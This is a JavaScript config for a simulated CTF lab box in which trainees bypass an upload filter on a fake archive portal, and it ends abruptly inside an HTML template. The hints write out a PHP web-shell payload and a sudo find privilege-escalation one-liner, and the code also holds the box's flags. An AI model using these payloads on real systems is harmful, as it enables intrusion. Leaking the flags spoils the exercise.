/* ============================================================
   CTF ARENA — Box A8: The Forgotten Upload
   File Upload Vulnerability | Ashen Archive
   Config: upload engine, PHP execution sim, filesystem, flags, hints, lore
   ============================================================ */

const A8Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Forgotten Upload',
    subtitle: 'File Upload Vulnerability \u2014 Ashen Archive',
    difficulty: 'Intermediate',
    accent: '#e74c3c',
    storageKey: 'hexworth_ctf_a8',
    trackerKey: 'ctf_a8',

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 8192 MB OK',
            'Detecting drives... /dev/sda1 (256GB SSD)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',        app: 'browser'  },
            { id: 'notes',    label: 'Notes',       icon: '\uD83D\uDCDD',        app: 'notes'    },
            { id: 'hints',    label: 'Hints',       icon: '\uD83D\uDCA1',        app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9',        app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: 10.10.14.24\n'
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', value: 'flag{4sh3n_4rch1v3_upl04d_byp4ss}', points: 100 },
        { id: 'root', value: 'flag{4sh3n_r00t_f1nd_pr1v3sc}',     points: 200 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1000,
        hintPenalty: -50,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 900000, points: 100 }  // 15 minutes
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: "The file upload has both client-side and server-side validation. Client-side can be bypassed, but the server also blocks .php directly. Try alternative PHP extensions that the server might still execute.",
            penalty: -50
        },
        {
            id: 'hint2',
            text: "Alternative PHP extensions that Apache/PHP may execute: .phtml, .php5, .pHp (case variation). Upload a web shell using one of these extensions.",
            penalty: -50
        },
        {
            id: 'hint3',
            text: "Once you have a web shell accessible in /archive/uploads/, use: <?php system('cat /home/www-data/user.txt'); ?> to get the user flag. Check sudo -l for privilege escalation paths.",
            penalty: -50
        },
        {
            id: 'hint4',
            text: "www-data can run /usr/bin/find as root with no password. Use: sudo find / -exec cat /root/root.txt \\; -quit",
            penalty: -50
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        outro: 'The Ashen Archive has been compromised. Their artifact submission portal trusted file extensions over true content inspection \u2014 a single .phtml bypass was all it took. From www-data\'s home directory to the root flag via sudo find, the Archive\'s forgotten upload became its undoing.'
    },

    // ═══════════════════════════════════════════════════════
    // RUNTIME STATE — ephemeral per session (not stored)
    // ═══════════════════════════════════════════════════════

    // Tracks uploaded files so the /archive/uploads/ directory listing stays current
    _uploadedFiles: [],

    // ═══════════════════════════════════════════════════════
    // WEB APP — The Ashen Archive
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.10.14.24/archive/',

        pages: {

            // ── Main Portal — Artifact Submission ───────────
            '/archive/': {
                title: 'Ashen Archive \u2014 Artifact Submission Portal',
                html: `
                    <div style="text-align:center; margin-bottom:28px; padding-bottom:18px; border-bottom:2px solid #e74c3c;">
                        <h1 style="color:#e74c3c; font-size:1.5rem; font-family:Georgia,serif; margin-bottom:4px; letter-spacing:0.05em;">&#9760; Ashen Archive</h1>
                        <div style="color:#888; font-size:0.75rem; letter-spacing:0.12em;">ARTIFACT SUBMISSION PORTAL v1.4.2 &mdash; Keepers of Forbidden Knowledge</div>
                    </div>

                    <!-- Recently submitted artifacts list -->
                    <div style="max-width:680px; margin:0 auto 28px;">
                        <div style="color:#aaa; font-size:0.7rem; letter-spacing:0.1em; margin-bottom:10px; border-bottom:1px solid #333; padding-bottom:6px;">RECENTLY SUBMITTED ARTIFACTS</div>
                        <table style="width:100%; border-collapse:collapse; font-size:0.8rem;">
                            <thead>
                                <tr style="background:#1a0a0a;">
                                    <th style="padding:6px 10px; text-align:left; color:#e74c3c; border-bottom:2px solid #4a1a1a;">#</th>
                                    <th style="padding:6px 10px; text-align:left; color:#e74c3c; border-bottom:2px solid #4a1a1a;">Artifact Name</th>
                                    <th style="padding:6px 10px; text-align:left; color:#e74c3c; border-bottom:2px solid #4a1a1a;">Type</th>
                                    <th style="padding:6px 10px; text-align:left; color:#e74c3c; border-bottom:2px solid #4a1a1a;">Submitted By</th>
                                    <th style="padding:6px 10px; text-align:left; color:#e74c3c; border-bottom:2px solid #4a1a1a;">Date</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a; color:#999;">001</td><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a;">tome_of_shadows.txt</td><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a; color:#aaa;">.txt</td><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a; color:#888;">archivist_maren</td><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a; color:#666;">2024-02-01</td></tr>
                                <tr><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a; color:#999;">002</td><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a;">cipher_codex.pdf</td><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a; color:#aaa;">.pdf</td><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a; color:#888;">scribe_voltan</td><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a; color:#666;">2024-02-03</td></tr>
                                <tr><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a; color:#999;">003</td><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a;">forgotten_rites.doc</td><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a; color:#aaa;">.doc</td><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a; color:#888;">elder_kavreth</td><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a; color:#666;">2024-02-07</td></tr>
                                <tr><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a; color:#999;">004</td><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a;">ash_chronicle_vol4.txt</td><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a; color:#aaa;">.txt</td><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a; color:#888;">archivist_maren</td><td style="padding:5px 10px; border-bottom:1px solid #2a1a1a; color:#666;">2024-02-09</td></tr>
                            </tbody>
                        </table>
                        <div style="margin-top:8px; text-align:right;">
                            <a href="/archive/uploads/" style="color:#e74c3c; font-size:0.7rem; text-decoration:none;">View upload directory &rarr;</a>
                        </div>
                    </div>

                    <!-- Upload form -->
                    <div style="max-width:520px; margin:0 auto;">
                        <div style="color:#aaa; font-size:0.7rem; letter-spacing:0.1em; margin-bottom:10px; border-bottom:1px solid #333; padding-bottom:6px;">SUBMIT NEW ARTIFACT</div>

                        <form style="background:#1a0a0a; border:1px solid #4a1a1a; border-radius:6px; padding:20px;">
                            <div style="margin-bottom:14px;">
                                <label style="display:block; color:#ccc; font-size:0.75rem; margin-bottom:5px;">Artifact Filename:</label>
                                <input type="text" name="filename" placeholder="e.g. document.txt"
                                       style="width:100%; padding:8px 12px; background:#0d0505; color:#eee; border:1px solid #5a2a2a; border-radius:4px; font-family:inherit; font-size:0.85rem; box-sizing:border-box;">
                                <div style="color:#555; font-size:0.65rem; margin-top:4px;">Allowed types: .txt, .doc, .pdf</div>
                            </div>
                            <div style="margin-bottom:16px;">
                                <label style="display:block; color:#ccc; font-size:0.75rem; margin-bottom:5px;">Artifact Content:</label>
                                <textarea name="content" placeholder="Paste artifact content here..." rows="5"
                                          style="width:100%; padding:8px 12px; background:#0d0505; color:#eee; border:1px solid #5a2a2a; border-radius:4px; font-family:'Courier New',monospace; font-size:0.8rem; box-sizing:border-box; resize:vertical;"></textarea>
                            </div>
                            <button type="submit"
                                    style="padding:9px 28px; background:#e74c3c; color:#fff; border:none; border-radius:4px; font-family:inherit; font-weight:700; cursor:pointer; font-size:0.85rem; letter-spacing:0.05em;">Upload Artifact</button>
                        </form>

                        <div data-results style="margin-top:14px;"></div>
                    </div>

                    <div style="margin-top:28px; padding-top:12px; border-top:1px solid #2a1a1a; text-align:center; color:#444; font-size:0.65rem; max-width:680px; margin-left:auto; margin-right:auto;">
                        Ashen Archive Submission Portal &copy; 2024 | Server: ashen-archive | Apache/2.4.57 PHP/8.1.12
                    </div>
                `,
                formHandler: function(data, engine) {
                    return A8Config._handleUpload(data, engine);
                }
            },

            // ── Upload Directory — Directory Listing ─────────
            '/archive/uploads/': {
                title: 'Index of /archive/uploads/ \u2014 Ashen Archive',
                // html as function reads _uploadedFiles dynamically each visit
                html: function(queryString, browserInstance) {
                    return A8Config._renderUploadsDir();
                }
            },

            // ── PHP Shell Execution — dynamic file access ────
            // Files are routed here via /archive/uploads/{filename}
            // The Browser.js _renderPage tries exact match first, so we use
            // a catch-all pattern handled via the 404 override below.
            // We register the dynamic path in navigate() by wiring _wireLinks.
            // Instead, we define a pattern-matched page using a function html:

            '/archive/uploads/shell.php': {
                title: 'Uploaded File \u2014 Ashen Archive',
                html: function(qs, bi) { return A8Config._renderUploadedFile('shell.php', qs); }
            },

            // ── Admin Panel — 403 then accessible after shell ─
            '/archive/admin/': {
                title: 'Archive Admin Panel \u2014 Ashen Archive',
                html: function(qs, bi) { return A8Config._renderAdmin(); }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILE UPLOAD ENGINE
    // ═══════════════════════════════════════════════════════

    _handleUpload(data, engine) {
        const filename = (data.filename || '').trim();
        const content  = (data.content  || '').trim();

        if (!filename) {
            return A8Config._msgHtml('error', 'Error: No filename provided. Please enter a filename.');
        }
        if (!content) {
            return A8Config._msgHtml('error', 'Error: No content provided. Artifacts cannot be empty.');
        }

        const ext = A8Config._getExtension(filename);

        // ── Hard server-side block for .php (exact, case-insensitive) ──
        // Other PHP variants (.phtml, .php5, .pHp) bypass this check
        if (/^\.php$/i.test(ext)) {
            return A8Config._msgHtml('error',
                'Upload Error: PHP files are not permitted on this server.\n' +
                '<small style="color:#888;">Server-side validation rejected the upload. (HTTP 403)</small>');
        }

        // ── Client-side check bypass detection (educational feedback) ──
        // Real .php was caught above. If we reach here with a PHP-family ext,
        // the student has bypassed both client-side and found a server gap.
        const isPhpVariant = A8Config._isExecutableExt(ext, filename);

        // ── Allowed safe types pass through normally ──
        const safeExts = ['.txt', '.doc', '.pdf', '.docx', '.rtf'];
        const isSafe   = safeExts.includes(ext.toLowerCase());

        if (!isSafe && !isPhpVariant) {
            return A8Config._msgHtml('error',
                `Upload Error: File type "${A8Config._escHtml(ext)}" is not allowed.\n` +
                '<small style="color:#888;">Allowed: .txt, .doc, .pdf</small>');
        }

        // ── Store uploaded file in runtime state ──
        const already = A8Config._uploadedFiles.find(f => f.name === filename);
        if (!already) {
            A8Config._uploadedFiles.push({
                name:    filename,
                content: content,
                size:    content.length + ' bytes',
                date:    '2024-02-14 ' + new Date().toTimeString().slice(0, 8),
                php:     isPhpVariant
            });

            // Dynamically register the uploaded file as a navigable page
            // so the browser can render it when the student clicks the link.
            A8Config._registerUploadedFilePage(filename, content, isPhpVariant);
        }

        if (isPhpVariant) {
            return `<div style="background:rgba(231,76,60,0.08); border:1px solid rgba(231,76,60,0.3); border-radius:6px; padding:14px; font-size:0.82rem;">
                <div style="color:#2ecc71; font-weight:bold; margin-bottom:6px;">&#10003; Upload successful!</div>
                <div style="color:#ccc; margin-bottom:8px;">Artifact <strong style="color:#fff;">${A8Config._escHtml(filename)}</strong> has been stored.</div>
                <div style="color:#888; font-size:0.75rem; margin-bottom:10px;">Access your file at:
                    <a href="/archive/uploads/${A8Config._escHtml(filename)}" style="color:#e74c3c; font-family:monospace;">/archive/uploads/${A8Config._escHtml(filename)}</a>
                </div>
                <div style="background:#1a0808; border:1px solid #4a1a1a; border-radius:4px; padding:10px; font-size:0.7rem; color:#e67e22;">
                    <strong>Server Notice:</strong> The archive server processed your file. PHP interpreter loaded for compatible extensions.
                </div>
            </div>`;
        }

        return `<div style="background:rgba(46,204,113,0.08); border:1px solid rgba(46,204,113,0.3); border-radius:6px; padding:14px; font-size:0.82rem;">
            <div style="color:#2ecc71; font-weight:bold; margin-bottom:6px;">&#10003; Upload successful!</div>
            <div style="color:#ccc; margin-bottom:6px;">Artifact <strong style="color:#fff;">${A8Config._escHtml(filename)}</strong> accepted.</div>
            <div style="color:#888; font-size:0.75rem;">View at: <a href="/archive/uploads/${A8Config._escHtml(filename)}" style="color:#3498db; font-family:monospace;">/archive/uploads/${A8Config._escHtml(filename)}</a></div>
        </div>`;
    },

    // ═══════════════════════════════════════════════════════
    // REGISTER UPLOADED FILE AS A NAVIGABLE PAGE
    // ═══════════════════════════════════════════════════════

    _registerUploadedFilePage(filename, content, isPhpVariant) {
        const path = `/archive/uploads/${filename}`;
        // Add to webApp.pages so Browser.js can find it
        A8Config.webApp.pages[path] = {
            title: `${filename} \u2014 Ashen Archive`,
            html: function(qs, bi) {
                return A8Config._renderUploadedFile(filename, qs);
            }
        };
    },

    // ═══════════════════════════════════════════════════════
    // RENDER UPLOAD DIRECTORY LISTING
    // ═══════════════════════════════════════════════════════

    _renderUploadsDir() {
        // Pre-existing files always shown in the listing
        const defaults = [
            { name: 'tome_of_shadows.txt',   size: '2.1K', date: '2024-02-01 11:22:04' },
            { name: 'cipher_codex.pdf',       size: '84K',  date: '2024-02-03 09:14:51' },
            { name: 'forgotten_rites.doc',    size: '17K',  date: '2024-02-07 16:03:28' },
            { name: 'ash_chronicle_vol4.txt', size: '5.3K', date: '2024-02-09 14:55:10' }
        ];

        let rows = '';

        // Parent directory link
        rows += `<tr>
            <td style="padding:3px 12px; font-family:monospace; font-size:0.78rem;">
                <a href="/archive/" style="color:#3498db; text-decoration:none;">[DIR]</a>
            </td>
            <td style="padding:3px 12px;">
                <a href="/archive/" style="color:#3498db; text-decoration:none; font-family:monospace; font-size:0.78rem;">Parent Directory</a>
            </td>
            <td style="padding:3px 12px; color:#666; font-size:0.75rem; font-family:monospace;"></td>
            <td style="padding:3px 12px; color:#666; font-size:0.75rem; font-family:monospace;"></td>
        </tr>`;

        // Default files
        defaults.forEach(f => {
            rows += `<tr>
                <td style="padding:3px 12px; font-family:monospace; font-size:0.78rem; color:#888;">[   ]</td>
                <td style="padding:3px 12px;">
                    <a href="/archive/uploads/${f.name}" style="color:#ccc; text-decoration:none; font-family:monospace; font-size:0.78rem;">${f.name}</a>
                </td>
                <td style="padding:3px 12px; color:#666; font-size:0.75rem; font-family:monospace;">${f.date}</td>
                <td style="padding:3px 12px; color:#666; font-size:0.75rem; font-family:monospace;">${f.size}</td>
            </tr>`;
        });

        // Student-uploaded files
        A8Config._uploadedFiles.forEach(f => {
            const icon = f.php
                ? '<span style="color:#e74c3c;">[PHP]</span>'
                : '<span style="color:#888;">[   ]</span>';
            rows += `<tr>
                <td style="padding:3px 12px; font-family:monospace; font-size:0.78rem;">${icon}</td>
                <td style="padding:3px 12px;">
                    <a href="/archive/uploads/${f.name}" style="color:${f.php ? '#e74c3c' : '#ccc'}; text-decoration:none; font-family:monospace; font-size:0.78rem;">${A8Config._escHtml(f.name)}</a>
                </td>
                <td style="padding:3px 12px; color:#666; font-size:0.75rem; font-family:monospace;">${f.date}</td>
                <td style="padding:3px 12px; color:#666; font-size:0.75rem; font-family:monospace;">${f.size}</td>
            </tr>`;
        });

        return `
            <div style="font-family:monospace; font-size:0.8rem;">
                <div style="color:#aaa; margin-bottom:12px; padding-bottom:8px; border-bottom:1px solid #333;">
                    <span style="color:#e74c3c;">Index of</span> /archive/uploads/
                </div>
                <div style="background:#0d0505; border:1px solid #3a1a1a; border-radius:4px; overflow:hidden;">
                    <table style="width:100%; border-collapse:collapse;">
                        <thead>
                            <tr style="background:#1a0808; border-bottom:1px solid #3a1a1a;">
                                <th style="padding:6px 12px; text-align:left; color:#e74c3c; font-size:0.72rem; font-weight:normal;">Type</th>
                                <th style="padding:6px 12px; text-align:left; color:#e74c3c; font-size:0.72rem; font-weight:normal;">Name</th>
                                <th style="padding:6px 12px; text-align:left; color:#e74c3c; font-size:0.72rem; font-weight:normal;">Last Modified</th>
                                <th style="padding:6px 12px; text-align:left; color:#e74c3c; font-size:0.72rem; font-weight:normal;">Size</th>
                            </tr>
                        </thead>
                        <tbody>${rows}</tbody>
                    </table>
                </div>
                <div style="margin-top:10px; color:#555; font-size:0.65rem;">
                    Apache/2.4.57 (Debian) Server at 10.10.14.24 Port 80
                </div>
            </div>
        `;
    },

    // ═══════════════════════════════════════════════════════
    // RENDER UPLOADED FILE (PHP EXECUTION SIMULATION)
    // ═══════════════════════════════════════════════════════

    _renderUploadedFile(filename, queryString) {
        const fileRecord = A8Config._uploadedFiles.find(f => f.name === filename);

        // Default static files — serve as plaintext
        const staticFiles = {
            'tome_of_shadows.txt':   'Tome of Shadows — Volume I\n\nIn the beginning there was ash...\n[Content continues for 47 pages]',
            'cipher_codex.pdf':      '[Binary PDF content — not displayable as text]',
            'forgotten_rites.doc':   '[Binary DOC content — not displayable as text]',
            'ash_chronicle_vol4.txt': 'Ash Chronicle — Volume IV\n\nThe Fourth Age of Reckoning...\n[Content continues]'
        };

        if (!fileRecord) {
            if (staticFiles[filename]) {
                return `<div style="background:#0d0505; border:1px solid #333; border-radius:4px; padding:16px; font-family:'Courier New',monospace; font-size:0.78rem; color:#ccc; white-space:pre-wrap; line-height:1.6;">${A8Config._escHtml(staticFiles[filename])}</div>`;
            }
            return `<div style="color:#e74c3c; text-align:center; padding:40px; font-size:0.85rem;">
                <strong>404 Not Found</strong><br>
                <span style="color:#888; font-size:0.75rem; margin-top:8px; display:block;">The file "${A8Config._escHtml(filename)}" was not found on this server.</span>
            </div>`;
        }

        // Not a PHP-executable file — serve as plaintext
        if (!fileRecord.php) {
            return `<div style="background:#0d0505; border:1px solid #333; border-radius:4px; padding:16px; font-family:'Courier New',monospace; font-size:0.78rem; color:#ccc; white-space:pre-wrap; line-height:1.6;">${A8Config._escHtml(fileRecord.content)}</div>`;
        }

        // ── PHP execution path ──
        // Parse ?cmd= query parameter (for GET-based web shells like <?php system($_GET['cmd']); ?>)
        let cmdOverride = null;
        if (queryString) {
            const params = queryString.split('&').reduce((acc, pair) => {
                const [k, v] = pair.split('=');
                if (k && v !== undefined) acc[decodeURIComponent(k)] = decodeURIComponent(v.replace(/\+/g, ' '));
                return acc;
            }, {});
            cmdOverride = params['cmd'] || null;
        }

        const phpContent = fileRecord.content;

        // PHP execution engine — parse system() / exec() / passthru() / shell_exec() calls
        const execOutput = A8Config._executePHP(phpContent, cmdOverride);

        if (execOutput === null) {
            // PHP file with no executable functions — show as raw PHP source hint
            return `<div style="background:#0d0505; border:1px solid #4a1a1a; border-radius:4px; padding:16px; font-family:'Courier New',monospace; font-size:0.78rem; color:#e67e22; white-space:pre-wrap; line-height:1.6;">
<span style="color:#555; font-size:0.65rem; display:block; margin-bottom:8px;">PHP 8.1.12 — Executing ${A8Config._escHtml(filename)}</span>${A8Config._escHtml(phpContent)}</div>`;
        }

        return `<div style="background:#0d0505; border:1px solid #4a1a1a; border-radius:4px; padding:16px; font-size:0.78rem; line-height:1.6;">
            <div style="color:#555; font-size:0.65rem; margin-bottom:10px; font-family:monospace;">PHP 8.1.12 &mdash; Executing ${A8Config._escHtml(filename)}</div>
            <div style="font-family:'Courier New',monospace; color:#e8e8e8; white-space:pre-wrap;">${execOutput}</div>
        </div>`;
    },

    // ═══════════════════════════════════════════════════════
    // PHP EXECUTION ENGINE
    // ═══════════════════════════════════════════════════════

    _executePHP(phpContent, cmdOverride) {
        // Detect if content has any PHP at all
        if (!phpContent.includes('<?php') && !phpContent.includes('<?=')) return null;

        // ── GET-parameter shell: <?php system($_GET['cmd']); ?> ──
        if (cmdOverride && /\$_GET\s*\[.*?['\"]cmd['\"].*?\]/.test(phpContent)) {
            return A8Config._simulateCommand(cmdOverride);
        }
        if (cmdOverride && /\$_GET\s*\[.*?['\"]c['\"].*?\]/.test(phpContent)) {
            return A8Config._simulateCommand(cmdOverride);
        }
        if (cmdOverride && /\$_REQUEST/.test(phpContent)) {
            return A8Config._simulateCommand(cmdOverride);
        }

        // ── Extract and simulate hardcoded system() / exec() / passthru() / shell_exec() calls ──
        const sysMatch = phpContent.match(/(?:system|exec|passthru|shell_exec)\s*\(\s*(['"`])(.*?)\1\s*\)/s);
        if (sysMatch) {
            return A8Config._simulateCommand(sysMatch[2]);
        }

        // ── phpinfo() ──
        if (/phpinfo\s*\(\s*\)/.test(phpContent)) {
            return A8Config._phpInfoOutput();
        }

        // ── PHP file with no recognized executable function ──
        return null;
    },

    // ═══════════════════════════════════════════════════════
    // COMMAND SIMULATION (server-side execution output)
    // ═══════════════════════════════════════════════════════

    _simulateCommand(cmd) {
        const c = cmd.trim();

        // whoami
        if (/^whoami$/.test(c)) return 'www-data';

        // id
        if (/^id$/.test(c)) return 'uid=33(www-data) gid=33(www-data) groups=33(www-data)';

        // hostname
        if (/^hostname$/.test(c)) return 'ashen-archive';

        // uname
        if (/^uname\s*-a$/.test(c)) return 'Linux ashen-archive 5.15.0-92-generic #102-Ubuntu SMP Wed Jan 10 09:33:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux';

        // pwd
        if (/^pwd$/.test(c)) return '/var/www/html/archive/uploads';

        // ls /home/
        if (/^ls\s+(-l[a-z]*\s+)?\/home\/?$/.test(c)) {
            return 'total 12\ndrwxr-xr-x 4 root     root     4096 Feb  1 08:00 .\ndrwxr-xr-x 1 root     root     4096 Feb  1 08:00 ..\ndrwx------ 3 www-data www-data 4096 Feb  1 09:12 www-data';
        }

        // ls (current dir or /var/www/html/archive/uploads)
        if (/^ls(\s+(-la?|-al?)\s*)?$/.test(c) || /^ls\s+(-la?|-al?)\s*$/.test(c) || /^ls\s+\/var\/www\/html\/archive\/uploads\/?$/.test(c)) {
            const dynFiles = A8Config._uploadedFiles.map(f => f.name).join('\n');
            return [
                'total 64',
                'drwxrwxrwx 2 www-data www-data 4096 Feb 14 08:00 .',
                'drwxr-xr-x 5 www-data www-data 4096 Feb  1 08:00 ..',
                '-rw-r--r-- 1 www-data www-data 2100 Feb  1 11:22 tome_of_shadows.txt',
                '-rw-r--r-- 1 www-data www-data 86016 Feb  3 09:14 cipher_codex.pdf',
                '-rw-r--r-- 1 www-data www-data 17408 Feb  7 16:03 forgotten_rites.doc',
                '-rw-r--r-- 1 www-data www-data 5427 Feb  9 14:55 ash_chronicle_vol4.txt',
                dynFiles ? dynFiles.split('\n').map(fn => `-rw-r--r-- 1 www-data www-data   512 Feb 14 08:01 ${fn}`).join('\n') : ''
            ].filter(Boolean).join('\n');
        }

        // cat user.txt (various paths)
        if (/cat\s+\/home\/www-data\/user\.txt/.test(c) || /cat\s+~\/user\.txt/.test(c) || /cat\s+user\.txt/.test(c)) {
            return 'flag{4sh3n_4rch1v3_upl04d_byp4ss}';
        }

        // cat /etc/passwd
        if (/cat\s+\/etc\/passwd/.test(c)) {
            return 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\narchive_svc:x:1001:1001:Ashen Archive Service:/home/archive_svc:/bin/bash';
        }

        // cat /etc/shadow — permission denied
        if (/cat\s+\/etc\/shadow/.test(c)) {
            return 'cat: /etc/shadow: Permission denied';
        }

        // ls /root/
        if (/ls\s+(-l[a-z]*\s+)?\/root\/?$/.test(c)) {
            return 'ls: cannot open directory \'/root/\': Permission denied';
        }

        // sudo -l
        if (/^sudo\s+-l$/.test(c)) {
            return 'Matching Defaults entries for www-data on ashen-archive:\n    env_reset, mail_badpass\n\nUser www-data may run the following commands on ashen-archive:\n    (ALL : ALL) NOPASSWD: /usr/bin/find';
        }

        // sudo find ... -exec cat /root/root.txt — root flag via sudo find privesc
        // MUST come before the bare cat /root/root.txt deny check because the
        // full sudo find command contains the substring "cat /root/root.txt"
        if (/sudo\s+find/.test(c) && /root\.txt/.test(c)) {
            return 'flag{4sh3n_r00t_f1nd_pr1v3sc}\n/root/root.txt';
        }

        // cat /root/root.txt (without sudo) — permission denied, must use sudo find
        if (/cat\s+\/root\/root\.txt/.test(c)) {
            return 'cat: /root/root.txt: Permission denied';
        }

        // sudo find generic (without root.txt)
        if (/^sudo\s+find\s+\/\s+-exec/.test(c)) {
            return '/var/www/html/archive/uploads\n/var/www/html/archive\n/var/www/html\n/var/www\n/etc/apache2/sites-enabled/000-default.conf\n... (many results, command terminated)';
        }

        // find / -perm -4000 (SUID search)
        if (/find\s+\/\s+-perm\s+-[u=]?4000/.test(c) || /find\s+\/\s+-perm\s+\/4000/.test(c)) {
            return '/usr/bin/su\n/usr/bin/passwd\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/mount\n/usr/bin/umount\n/usr/bin/find';
        }

        // find /home/www-data — home directory enumeration
        if (/find\s+\/home\/www-data/.test(c)) {
            return '/home/www-data\n/home/www-data/.bash_history\n/home/www-data/.profile\n/home/www-data/user.txt';
        }

        // ls /home/www-data/
        if (/ls\s+(-[a-z]+\s+)?\/home\/www-data/.test(c)) {
            return 'total 20\ndrwx------ 3 www-data www-data 4096 Feb  1 09:12 .\ndrwxr-xr-x 4 root     root     4096 Feb  1 08:00 ..\n-rw------- 1 www-data www-data   38 Feb  1 09:12 user.txt\n-rw-r--r-- 1 www-data www-data  220 Feb  1 09:00 .bash_logout\n-rw-r--r-- 1 www-data www-data 3526 Feb  1 09:00 .bashrc';
        }

        // env / printenv
        if (/^env$/.test(c) || /^printenv$/.test(c)) {
            return 'APACHE_RUN_DIR=/var/run/apache2\nAPACHE_PID_FILE=/var/run/apache2/apache2.pid\nAPACHE_RUN_USER=www-data\nAPACHE_RUN_GROUP=www-data\nAPACHE_LOG_DIR=/var/log/apache2\nAPACHE_ENVVARS=/etc/apache2/envvars\nSHELL=/bin/sh\nPWD=/var/www/html/archive/uploads';
        }

        // which / type commands
        if (/^which\s+\w+$/.test(c)) {
            const bin = c.split(/\s+/)[1];
            const bins = { 'python': null, 'python3': '/usr/bin/python3', 'perl': '/usr/bin/perl', 'nc': '/usr/bin/nc', 'wget': '/usr/bin/wget', 'curl': '/usr/bin/curl', 'php': '/usr/bin/php' };
            return bins[bin] !== undefined ? (bins[bin] || `${bin}: not found`) : `/usr/bin/${bin}`;
        }

        // Unknown command — realistic error
        const firstWord = c.split(/\s+/)[0];
        return `sh: 1: ${A8Config._escHtml(firstWord)}: not found`;
    },

    // ═══════════════════════════════════════════════════════
    // ADMIN PANEL RENDERER
    // ═══════════════════════════════════════════════════════

    _renderAdmin() {
        // After shell access, root flag becomes visible in admin panel config leak
        const hasShell = A8Config._uploadedFiles.some(f => f.php);

        if (!hasShell) {
            return `<div style="text-align:center; padding:60px 20px; color:#888;">
                <div style="font-size:2rem; color:#e74c3c; margin-bottom:12px;">403</div>
                <div style="color:#ccc; font-size:0.9rem; margin-bottom:6px; font-weight:bold;">Forbidden</div>
                <div style="font-size:0.75rem; color:#666;">You don't have permission to access this resource.</div>
                <div style="margin-top:16px; font-size:0.65rem; color:#555;">Apache/2.4.57 (Debian) Server at 10.10.14.24 Port 80</div>
            </div>`;
        }

        // Shell uploaded — admin config is readable
        return `<div style="font-size:0.82rem;">
            <div style="color:#e74c3c; font-size:1.1rem; font-weight:bold; margin-bottom:12px; padding-bottom:10px; border-bottom:1px solid #4a1a1a;">&#9760; Archive Admin Panel</div>
            <div style="background:#1a0808; border:1px solid #4a1a1a; border-radius:4px; padding:14px; margin-bottom:16px;">
                <div style="color:#888; font-size:0.65rem; letter-spacing:0.1em; margin-bottom:8px;">SERVER CONFIGURATION</div>
                <div style="font-family:monospace; font-size:0.75rem; color:#ccc; line-height:1.8;">
                    <span style="color:#e74c3c;">DB_HOST</span>=localhost<br>
                    <span style="color:#e74c3c;">DB_USER</span>=archive_svc<br>
                    <span style="color:#e74c3c;">DB_PASS</span>=4sh3n_s3cr3t_2024<br>
                    <span style="color:#e74c3c;">ADMIN_TOKEN</span>=eyJhbGciOiJIUzI1NiJ9.archive_admin.xyz<br>
                    <span style="color:#e74c3c;">ROOT_FLAG_PATH</span>=/root/root.txt<br>
                    <span style="color:#888; font-size:0.65rem;">Note: Use sudo find to read root-owned files (see sudo -l)</span>
                </div>
            </div>
